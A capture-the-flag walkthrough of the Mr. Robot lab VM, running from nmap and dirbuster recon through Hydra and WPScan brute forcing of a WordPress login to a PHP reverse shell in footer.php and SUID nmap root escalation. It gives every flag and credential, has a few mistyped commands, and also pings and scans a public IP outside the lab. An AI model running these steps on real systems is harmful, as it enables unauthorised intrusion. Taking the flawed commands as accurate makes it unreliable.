# Mr. Robot  
Enough said in that statement already! We have all seen the TV show. And of course that hit our inner hacker bone to the core. And as more and more people wake up to watch and learn what is 
going on around them, we all want apart of that.  
So join FSociety!  
https://www.whoismrrobot.com/  
What are you going to do? Are you going to become the Hacker you want to be, or remain a Scr1p7 K1dd13! The choice is yours...  
Make the Call **NOW**!!!
  
### Wake Up  
**Patriot** ~ The American Dream is a Myth!  
**Executive** ~ Everyone Steals That's How It Works!  
**Capitalist** ~ Give a man a gun, and he'll rob a bank. Give a man a bank and he'll rob the World!  
**Businessman** ~ You've Been Owned!  
  
## Recon: Scanning & Playing with EVERYTHING!  
*We have seen it happen on movies & shows, now it is time to do it in real life!*  
Have you ever just wanted to know how hackers can bruteforce usernames & passwords on a server quickly? Well, truth be told, it is not as quick as they show on the big screen. But it is still done pretty easily!  
And here, we will discover just how easy we can do that.  
  
The first thing I want to do is open a new tab and perform a netdiscovery in order to get the IP Address of my target;  
```
$ sudo netdiscovery -r 10.0.0.0/24  
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                             
                                                                                                                                                                                                                                           
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 10.0.0.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 10.0.0.3        08:00:27:31:f8:b3      1      60  PCS Systemtechnik GmbH                                                                                                                                                                  
 10.0.0.48       08:00:27:0f:f2:93      1      60  PCS Systemtechnik GmbH 
```
Alright. So we have our target IP Address, in my case, it is 10.0.0.48.  
Now, I want to see what Ports are opened up and what they are. Remember how to do that from my Wakanda CTF? You can find the link to that on GitHub;  
https://github.com/CryptoH4ck3r/WakandaVM  
  
```
$ sudo nmap -sS -sV -A -p- 10.0.0.48  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 04:55 EST
Nmap scan report for 10.0.0.48
Host is up (0.00038s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 08:00:27:0F:F2:93 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 10.0.0.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.90 seconds
```
Okay, so judging by this output, we can easily see the following;  
*Open Ports*  
22 ~ Closed ~ SSH  
80 ~ open ~ http (Apache)  
443 ~ open ~ SSL/http Apache  
  
*Operating System*  
Linux 3.X|4.X  
Linux 3.10 - 4.11  
  
**PLEASE NOTE:** *If you would like to have a more robust nmap scan, try this command;*  
```
$ nmap -T4 -A -v 10.0.0.48
```
Now, what I want to do is open up my browser and navigate to the server IP and see what happens.  
And I will be 100% honest with you. I am truly enjoying the way this is loading up! I am completely shocked by it and loving it 100%.  
Let's do some testing right quick. First thing is, let's look at the code. See if we can find any files/folders/comments.  
In a set of comments, I see;  
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->  
Love this!  
I do see something a bit strange here. Inside of the "view code", I see this line;  
```
USER_IP='208.185.115.6'
```
That is **NOT** my IP Address. But let's ping it and see if we can find anything;  
```
$ ping 208.185.115.6 -c 5  
PING 208.185.115.6 (208.185.115.6) 56(84) bytes of data.
64 bytes from 208.185.115.6: icmp_seq=1 ttl=51 time=65.2 ms
64 bytes from 208.185.115.6: icmp_seq=2 ttl=51 time=63.9 ms
64 bytes from 208.185.115.6: icmp_seq=3 ttl=51 time=61.4 ms
64 bytes from 208.185.115.6: icmp_seq=4 ttl=51 time=61.4 ms
64 bytes from 208.185.115.6: icmp_seq=5 ttl=51 time=60.9 ms

--- 208.185.115.6 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 60.893/62.563/65.245/1.699 ms
```
Well, we can see that the target is alive. But what is it? Let's do a simple NMap scan to see if there are any open ports on it;  
```
$ nmap -Pn 208.185.115.6  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 05:27 EST
Nmap scan report for 208.185.115.6
Host is up (0.068s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds
```
Okay, so this is a type of web server. Alright. We will come back to this after a while.  
  
In the mean time. The website itself has a terminal we can use to interact with. Let's play with is. Do some basic commands like "ls" "whoami" etc.  
So the basic commands do not work. But if we type "help" we do get a list of commands that we can use. Let's play with those for a bit and see what we can find out. Maybe something is on there!  

What we are about to do is use DirBuster in order to get a full list of every single possible Directory of our target. There is already a lot going on, but let's see if can find more!  
```
$ dirbuster
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dec 29, 2022 5:50:31 AM org.apache.commons.httpclient.HttpMethodDirector executeWithRetry
INFO: I/O exception (org.apache.commons.httpclient.NoHttpResponseException) caught when processing request: The server 10.0.0.48 failed to respond
Dec 29, 2022 5:50:31 AM org.apache.commons.httpclient.HttpMethodDirector executeWithRetry
INFO: I/O exception (org.apache.commons.httpclient.NoHttpResponseException) caught when processing request: The server 10.0.0.48 failed to respond
Dec 29, 2022 5:50:31 AM org.apache.commons.httpclient.HttpMethodDirector executeWithRetry
INFO: Retrying request
```
Now, dirbuster is a visual based setup as well as terminal based. I did my dirbuster through the GUI aspect. And here are the settings I used to configure DirBuster;  
* Target URL: http://10.0.0.48  
* Number of Threads: 200 {Click "Go Faster"}  
* Select Scanning Type: List Based Brute Force  
* File with List of dirs/files: Click (Browser) /usr/share/wordlists/dirbuster/directory-list2.3-medium.txt  
* Start  
And these settings will display a plethora of different directories that are associated with our target. If we select the "Results" tab, and click on "Response", we can easily narrow down our results to the "200" pings.  
200 basically means that it is a good directory and is live.  
So if pick a random directory and type it into our URL Bar we should be able to see something. I am selecting;  
http://10.0.0.48/wp-admin.php 
And I get "Opps! That page can't be found." But that is AWESOME! It means that DirBuster actually got us a positive url.  
  
What else we can tell from our DirBuster results, is that there is WordPress installed on this server! This is going to be an epic journey now!  
  

Now, I do want to play with 1 more tool/toy. However you want to word it. Let's utilize a new program "nikto". Nikto will be able to tell us exactly what we are working with. Let's see how we can use it;  
```
$ nikto -h http://10.0.0.48  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.48
+ Target Hostname:    10.0.0.48
+ Target Port:        80
+ Start Time:         2022-12-29 06:05:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.0.0.48/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7889 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2022-12-29 06:08:04 (GMT-5) (131 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
As we can clearly see, we are using Apache, OSVDB-3092. And so much more! We even can see where the wordpress login is "/blog/wp-login.php"! Let's take a look at bruteforcing this website!  
  
## Bruteforcing!  
*Have you seen how quickly and easily the people on the TV Shows & Movies can just "Hack" into a server. Want to do the same? Keep reading!*  
  
**Username Bruteforcing**  
Before we can even think about doing any type of password cracking, we must first obtain a username to attack. And let's discover how we can do this.  
  
Now, from our directory scans, we can easily see that there is a login page located at;  
10.0.0.48/wp-login  

Let's take a look at any potential "robots" that we can see. So let's type in the URL Bar;  
10.0.0.48/robots.txt  
And we get the following;  
User-agent: *
fsocity.dic
key-1-of-3.txt  
  
**WHAT IS THIS!** "key-1-of-3.txt" INTERESTING!  
So now, if we simply type in our URL Bar this;  
10.0.0.48/key-1-of-3.txt  
We will actually get our first flag!  
073403c8a58a1f80d943455fb30724b9  
  
THAT WAS REALLY EASY!  
But I want to check out this "fsocity.dic" thing. So let's add that to our URL Bar like so;  
10.0.0.48/fsocity.dic  
And it saves a file! Looks like it is a dictionary file of some sort. Let's save that for later. It may come in hand on future adventures!  
  
Now. Let's actually get the bruteforcing started!  
In order to accomplish this, we will be utilizing multiple tools.  
**Configure BurpSuite**  
The first tool we will be looking at is BurpSuite.  
When you first open Burp, just click on the next button until you get to the dashboard of the program!  
1) Open BurpSuite  
2) Click on Proxy  
3) Select "Options"  
4) Click "Running" on Interface  
Now, open your Firefox browser and select "Preferences" -> "Advanced" -> "Network" -> Settings"  
1) Select "Manual Proxy Configuration"  
2) Copy Proxy IP from Burp to here  
3) Copy Port from Burp to here  
  
Now all you do is enable intercept and navigate to the wp-login page. Or if you are there already, just refresh the page!  
Now we are able to intercept the information between the target website and our computer.  
  
Once we have all that setup, let's look at something. Let's select the "Send to Intruder" and then open the Intruder tab.
What I want you to do is put in a random username & password in the login page and then click "Log In". 

Once you do that, go to Burp and find this string;  
log=admin&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.0.48%2Fwp-admin%2F&testcookie=1  
  
This will come in handy in just a second.  
Now, we can right click and select "Send to Repeater". This will allos us to change the username & password in the Burp and then send it back to the website to see what we can get.  
  
But right now, we are going to use a special tool called **Hydra** that will allow us to bruteforce the targets username!  
  
Open a new terminal and type in;  
**Make sure you are in the same folder that you saved the Password Dictionary we downloaded from our target!**  
```
**This is where you will copy the long string that starts with log=admin&pwd=password**  
**PLEASE NOTE:** We change the "log=admin" to "log=^USER^ to allow this field to select from the dictionary we downloaded. Think of it like we are calling a variable!  
$ hydra -V -L fsocity.dic -p test 10.0.0.48 http-post-form '/wp-login.php:og=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-29 07:00:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.0.0.48:80/wp-login.php:og=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[ATTEMPT] target 10.0.0.48 - login "true" - pass "test" - 1 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.0.0.48 - login "false" - pass "test" - 2 of 858235 [child 1] (0/0)
[ATTEMPT] target 10.0.0.48 - login "wikia" - pass "test" - 3 of 858235 [child 2] (0/0)
[ATTEMPT] target 10.0.0.48 - login "from" - pass "test" - 4 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.0.0.48 - login "the" - pass "test" - 5 of 858235 [child 4] (0/0)
[ATTEMPT] target 10.0.0.48 - login "now" - pass "test" - 6 of 858235 [child 5] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Wikia" - pass "test" - 7 of 858235 [child 6] (0/0)
[ATTEMPT] target 10.0.0.48 - login "extensions" - pass "test" - 8 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.0.0.48 - login "scss" - pass "test" - 9 of 858235 [child 8] (0/0)
[ATTEMPT] target 10.0.0.48 - login "window" - pass "test" - 10 of 858235 [child 9] (0/0)
[ATTEMPT] target 10.0.0.48 - login "http" - pass "test" - 11 of 858235 [child 10] (0/0)
[ATTEMPT] target 10.0.0.48 - login "var" - pass "test" - 12 of 858235 [child 11] (0/0)
[ATTEMPT] target 10.0.0.48 - login "page" - pass "test" - 13 of 858235 [child 12] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Robot" - pass "test" - 14 of 858235 [child 13] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Elliot" - pass "test" - 15 of 858235 [child 14] (0/0)
[ATTEMPT] target 10.0.0.48 - login "styles" - pass "test" - 16 of 858235 [child 15] (0/0)
[80][http-post-form] host: 10.0.0.48   login: true   password: test
[80][http-post-form] host: 10.0.0.48   login: wikia   password: test
[ATTEMPT] target 10.0.0.48 - login "and" - pass "test" - 17 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.0.0.48 - login "document" - pass "test" - 18 of 858235 [child 2] (0/0)
[80][http-post-form] host: 10.0.0.48   login: from   password: test
[80][http-post-form] host: 10.0.0.48   login: the   password: test
[80][http-post-form] host: 10.0.0.48   login: scss   password: test
[80][http-post-form] host: 10.0.0.48   login: Robot   password: test
[ATTEMPT] target 10.0.0.48 - login "mrrobot" - pass "test" - 19 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.0.0.48 - login "com" - pass "test" - 20 of 858235 [child 4] (0/0)
[ATTEMPT] target 10.0.0.48 - login "ago" - pass "test" - 21 of 858235 [child 8] (0/0)
[80][http-post-form] host: 10.0.0.48   login: window   password: test
[80][http-post-form] host: 10.0.0.48   login: http   password: test
[ATTEMPT] target 10.0.0.48 - login "function" - pass "test" - 22 of 858235 [child 13] (0/0)
[80][http-post-form] host: 10.0.0.48   login: styles   password: test
[80][http-post-form] host: 10.0.0.48   login: false   password: test
[80][http-post-form] host: 10.0.0.48   login: now   password: test
[80][http-post-form] host: 10.0.0.48   login: Wikia   password: test
[80][http-post-form] host: 10.0.0.48   login: extensions   password: test
[ATTEMPT] target 10.0.0.48 - login "eps1" - pass "test" - 23 of 858235 [child 9] (0/0)
[ATTEMPT] target 10.0.0.48 - login "null" - pass "test" - 24 of 858235 [child 10] (0/0)
[80][http-post-form] host: 10.0.0.48   login: page   password: test
[ATTEMPT] target 10.0.0.48 - login "chat" - pass "test" - 25 of 858235 [child 15] (0/0)
[ATTEMPT] target 10.0.0.48 - login "user" - pass "test" - 26 of 858235 [child 1] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Special" - pass "test" - 27 of 858235 [child 5] (0/0)
[ATTEMPT] target 10.0.0.48 - login "GlobalNavigation" - pass "test" - 28 of 858235 [child 6] (0/0)
[ATTEMPT] target 10.0.0.48 - login "images" - pass "test" - 29 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.0.0.48 - login "net" - pass "test" - 30 of 858235 [child 12] (0/0)
[80][http-post-form] host: 10.0.0.48   login: Elliot   password: test
```
Okay so that is a lot to look at. Now on my terminal screen, and yours too if you are following along, if Hydra found a match, that line highlights green. I see a username "Elliot" and password "test". Let's try that out!  

If we try to login with username "Elliot", we get the error message;  
"ERROR: The password you entered for the username Elliot is incorrect. Lost your password?"  
This is great because now we know we have a real username that we can use! Hydra did its job and we discovered a username. However, we do not know if the user is privileged, or just a regular user. But we can run the test again if 
we wanted to in order to find more usernames.  
  
  
**Password Bruteforcing:** 
*The username is locked. Time to pull the trigger and crack this website!*  
  
With the username "Elliot" this better be a privileged user, otherwise the creator of this VM SUCKS! LOL. It would only make sense to have Elliot have admin access!  
  
Now, it is time to use one of my favorite tools...**WPSCAN**!!!  
  
This is going to be easy to use. Follow along;  
```
$ wpscan --url http://10.0.0.48 --passwords fsocity.dic --usernames Elliot  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database
[i] Update completed.

[+] URL: http://10.0.0.48/ [10.0.0.48]
[+] Started: Thu Dec 29 07:13:37 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.0.0.48/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.48/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.48/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.48/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.30 identified (Outdated, released on 0001-01-01).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.0.0.48/daf29fc.html, Match: '-release.min.js?ver=4.3.30'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.0.0.48/daf29fc.html, Match: 'WordPress 4.3.30'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.0.0.48/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.0.48/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.30
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.30, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                                                                                                                                              
All Found                                                                                                                                                                                                                                   

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Dec 29 07:38:51 2022
[+] Requests Done: 1905
[+] Cached Requests: 6
[+] Data Sent: 614.655 KB
[+] Data Received: 195.53 MB
[+] Memory used: 336.176 MB
[+] Elapsed time: 00:25:14

```
Yes, this can take a long time. The bigger your password dictionary is, the longer this process will take. However, this is a catch 22. The smaller your password dictionary is, the less chances of you having the correct password.  

If we take a look at the upper section, there is a whole bunch of random information. What is all of this you ask? It is information about the website including the WordPress theme, Plugins, and known vulnerabilities.   
And now we can take a look at the section "Valid Combinations Found: | Username: Elliot, Password: ER28-0652".  
Now, for those of us who have actually watched the TV show. We should have known this was the password from S1E1 when he talks about himself!  
You already know what to do! Let's go test it out!  
  
**WE ARE IN!**  
How can we tell if we are admin or not? On the left side of the page, we can see a tab called "users". Click on that.  
Find the username "Elliot" and read over to the right, it should say Administrator!  
***WE HAVE FULL ADMIN ACCESS TO THE SITE!***  
  

What do we do now? Now we play around and get a feeling for WordPress if you have never used WordPress before. Here are the things I want to test out;  
1) Create a post  
2) Create a page  
3) Upload a picture  
4) Upload a file  
5) Add a new user  
  
Why do we do all of this? To see what we can do. If we can create a post or a new page, that means we are capable of taking over this site and having it do & say what ever we want it too.  
If we are able to upload pictures, then we can use a special tool that will allow us to create a RAT inside of a picture and when someone downloads the picture, we can take over their computer!  
Another aspect, if we can upload files and stuff to the dashboard, we may can upload things like reverse shells, and other things that will help us take over the entire server!  
And if we are able to add a new user, then we can easily create our own "back-door" that will grant us access to the website. However, this is not the best practical thing to do, I am sure sys-admins check users when they have been breached!  
  
  
## Hacking WordPress Sites  
The first thing we would like to test out is see if we can upload a PHP Reverse Shell to the target. This will allow us to upload the script to our target and then run it by accessing the URL in our browser. Let's have some fun learning this new trick!  
  
To get our hands on the PHP-Reverse-Shell script, let's head over to our pals at PentestMonkey;  
https://pentestmonkey.net/tools/web-shells/php-reverse-shell  
  
And we will download the "php-reverse-shell-1.0.tar.gz" from here;  
pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz  
And now that we have that file, let's see if we can unzip it like this;  
```
$ tar xzvf php-reverse-shell-1.0.tar.gz  
php-reverse-shell-1.0/
php-reverse-shell-1.0/COPYING.GPL
php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
php-reverse-shell-1.0/php-reverse-shell.php
php-reverse-shell-1.0/CHANGELOG
```
Now we can open the "php-reverse-shell.php" in any text editor you choose, I personally use (nano php-reverse-shell.php). The only thing we need to change in this file is the IP Address & the Port (optional). So open up that script in your editor and change the IP Address   
to the address of your Kali Machine and then save & close!   
  
Now that we have that setup, let's see if we can upload this shell script to the website. Go to the website, and select the tab "Media". From there, click on "Add New" And click on "Select Files". From there, navigate the window 
to where our php-reverse-shell.php file is located, and double click on that to upload to the website.  
And we get a error;  
"Sorry, this file type is not permitted for security reasons."  
What now? Well, we can copy/paste the shell script in the same directory and play with the new file a little bit. Like so;  
1) Try changing the name itself. (myshell.php.png) and try to upload that!  
*We can see that that did not work for us!*  
2) Let's see if we can upload a random image (go to Google and find one if you don't have one)  
*We are able to upload images to the website!* ~ We can click on the image we just uploaded and it will have a menu popup, highlight the "url" copy and paste that into a new tab. Boom. You have your image!  
3) Open up the "Appearance" -> "Editor" -> "footer" -> Copy/Paste the code directly in that file.  
*NOTE:* Copy the contents of the "footer.php" into a seperate text file so if you screw something up, you can revert back to the original content.  
*Copy/Paste:* Now we can copy/paste the contents of the php-reverse-shell.php into the footer.php section and click on "updated file" in order to save our work.  
3.A) Now that that is there, let's open a new tab and utilize our ncat command like so;  
```
$ nc -nvlp 1234  
```
While that is running, go to your browser and type in;  
10.0.0.48/footer.php  
**PLEASE NOTE:** Replace the 10.0.0.48 with the IP Address of your target!  
And now let's see what happens!  
```
$ nc -nvlp 1234  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.0.48.
Ncat: Connection from 10.0.0.48:58906.
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:19:38 up  3:26,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
And boom! We have access to the server!  
Now, what I want to do is take a look at the server;  
```
$ ls  
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
  
$ cd home  
  
$ ls  
robot
  
$ cd robot  
  
$ ls  
key-2-of-3.txt
password.raw-md5
  
$ cat key-2-of-3.txt  
cat: key-2-of-3.txt: Permission denied
  
$ cat password.raw-md5  
robot:c3fcd3d76192e4007dfb496cca67e13b  
```
## Changing Privileges & Become Root!  
*Root is only the beginning!*  
Now, we have found a user "robot" and a type of password. However, this is a md5 hash encryption. So let's hope on Google and find ourselves an MD5 Decryptor. 
After searching in multiple websites, I have not been able to find any database that has this hash in it. I finally found a website that discovered something;  
https://hashes.com/en/decrypt/hash  
FOUND:  
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz  
Okay. It looks like it converted to the freaking alphabet! Seriously!
  
Now what I want to try to do is go back to our session and do su robot; 
```
$ su robot  
su: must be run from a terminal  
```
What?!?!? We are **IN A TERMINAL!**. But do not fear. If we recall our memory from the Wakanda CTF, we remember that we can create a Python spawn! Let's do that now;  
```
$ python -c 'import pty; pty.spawn("/bin/bash")'  
daemon@linux:/home/robot$   
```
And now we have a shell access!  
Now, let's try to change the user to robot like so;  
```
$ su robot  
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ 
```
And now we have logged into the server with user Robot!  
**CONGRATS ON MAKING IT THIS FAR!**  
  
Now, if we do;  
```
$ cat key-2-of-3.txt  
822c73956184f694993bede3eb39f959  
```
We have our second key!  
You are really rocking this session right now! Keep grinding my friend!  
  
Now, what I would like to do is get access to the root. Why? We need to get the root access in order to get our root.txt and complete this CTF!  
  
  
## Suid Privilege Escalation  
```
$ sudo -l  

[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```
What I want to do is discover what directories & executables we can run, so take note of this next command to help us figure that out;  
```
$ find / -pem -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
Okay, so we have a few directories we can look into!  
That command above, will help us find binaries that have suid bit set (root) permissions!  
  
But what is weird, in the directories of executables we have access too, we have '/usr/local/bin/nmap'. This is really strange indeed! And you know what they say about something being strange?  
Let's look into it further!  
  
On our personal terminal, let's run this command;  
```
$ nmap --help  
```
What we want to do here is get out of the current user and into root access. If we Google search "nmap command terminal interactive" we will see something from "GTFOBins"  
https://gtfobins.github.io/gtfobins/nmap/  
And what we are looking for is the ability to interact with the nmap commands directly!  
Now, according to this website, we can do the following;  
```
$ nmap --interactive  
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
  
$ !sh  
  
# whoami 
root  
```
And now we are root! The reason this worked is because NMAP has a special permission to be used as a root user! And this will work in real-world scenerios as well!  
  
Now, what do we do?  
check this out;  
```
# cd root
  
# ls  
firstboot_done  key-3-of-3.txt  
  
# cat key-3-of-3.txt  
04787ddef27c3dee1ee161b21670b4e4  
```
And there is our 3rd and final key!

Congrats on making it through this challenge!  
  
  
## Thank You  
I want to say thank you for following along. And if you have any questions, comments, or issues, please feel free to reach out to me directly;  
**Email** ~ cryptoh4ck3r@proton.me  
**Twitter** ~ https://twitter.com/CryptoH4ck3r  

